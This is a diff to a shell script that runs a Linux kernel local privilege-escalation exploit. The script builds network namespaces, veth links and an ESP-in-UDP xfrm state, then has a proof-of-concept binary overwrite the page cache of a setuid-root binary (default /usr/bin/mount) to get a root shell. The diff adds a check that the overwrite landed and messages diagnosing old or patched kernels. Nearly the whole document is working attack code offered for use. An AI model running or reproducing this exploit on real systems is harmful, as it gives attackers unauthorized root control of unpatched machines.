@@ -13,7 +13,7 @@ if [ "${1:-}" = __write ]; then
     TARGET=$2; cd "$HERE"
     sysctl -qw net.ipv4.conf.all.rp_filter=0 2>/dev/null
     ip link add veth0 address 02:00:00:00:00:01 type veth peer name veth1 address 02:00:00:00:00:02
-    unshare -n sleep 600 & HP=$!; sleep 0.5
+    unshare -n sleep 600 >/dev/null 2>&1 & HP=$!; sleep 0.5
     ip link set veth0 netns "$HP"
     nsenter -t "$HP" -n sysctl -qw net.ipv4.conf.all.rp_filter=0 2>/dev/null
     nsenter -t "$HP" -n ip link set lo up
@@ -27,7 +27,7 @@ if [ "${1:-}" = __write ]; then
     sysctl -qw net.ipv4.conf.tdp0.rp_filter=0 2>/dev/null
     ip xfrm state add src 10.99.99.1 dst 10.99.99.2 proto esp spi 0x42434445 mode transport \
         aead 'rfc4106(gcm(aes))' 0x000102030405060708090a0b0c0d0e0f11223344 128 encap espinudp 4500 4500 0.0.0.0
-    "$POC" encap & sleep 0.4
+    "$POC" encap >/dev/null 2>&1 & sleep 0.4
     nsenter -t "$HP" -n "$POC" writex "$TARGET" 0 10.99.99.2 "$ELF"
     exit 0
 fi
@@ -38,7 +38,31 @@ unshare -Urn true 2>/dev/null || { echo "need unprivileged userns"; exit 2; }
 TARGET=${1:-/usr/bin/mount}
 [ -u "$TARGET" ] && [ "$(stat -c %u "$TARGET")" = 0 ] || { echo "$TARGET is not setuid-root"; exit 2; }
 
-unshare -Urn "$HERE/shell.sh" __write "$TARGET"
-echo "[*] $TARGET patched in page cache — root shell (Ctrl-D to exit and restore):"
-"$TARGET"
-"$POC" evict "$TARGET" 2>/dev/null   # drop the patched pages; on-disk file was never touched
+# Capture inner output in a var (no temp file). Inner's backgrounded idlers
+# (`sleep 600`, `poc encap`) have their fds sent to /dev/null, so they don't
+# hold this substitution's pipe open — it returns when inner's main flow exits.
+OUT=$(unshare -Urn "$HERE/shell.sh" __write "$TARGET" 2>&1)
+printf '%s\n' "$OUT"
+
+# ---- validate: did the page-cache overwrite actually land? ----
+# The exploit patches the first 160 bytes of TARGET's page cache with $ELF.
+# Page cache is global, so read it straight back here and compare.
+GOT=$(od -An -tx1 -N $(( ${#ELF} / 2 )) "$TARGET" | tr -d ' \n')
+if [ "$GOT" = "$ELF" ]; then
+    echo "[*] $TARGET patched in page cache — root shell (Ctrl-D to exit and restore):"
+    "$TARGET"
+    "$POC" evict "$TARGET" 2>/dev/null   # drop the patched pages; on-disk file was never touched
+    exit 0
+fi
+
+# ---- exploit did not land: report why ----
+"$POC" evict "$TARGET" 2>/dev/null        # nothing was dirtied, but restore anyway for safety
+if grep -qiE 'SO_ZEROCOPY|MSG_ZEROCOPY|Operation not supported|Protocol not (available|supported)|Address family not supported|openvswitch|No such (file or directory|device)' <<<"$OUT"; then
+    echo "[!] exploit FAILED to land — a required feature was rejected during setup." >&2
+    echo "    Likely KERNEL TOO OLD: no MSG_ZEROCOPY fraglist / OVS / ESP-in-UDP path for the bug to ride." >&2
+else
+    echo "[!] exploit FAILED to land — setup ran but the page cache was not modified." >&2
+    echo "    Likely KERNEL UPDATED/PATCHED: $(uname -r) has the SKBFL_SHARED_FRAG frag-strip fix." >&2
+fi
+echo "    page cache unchanged; on-disk $TARGET never touched." >&2
+exit 1
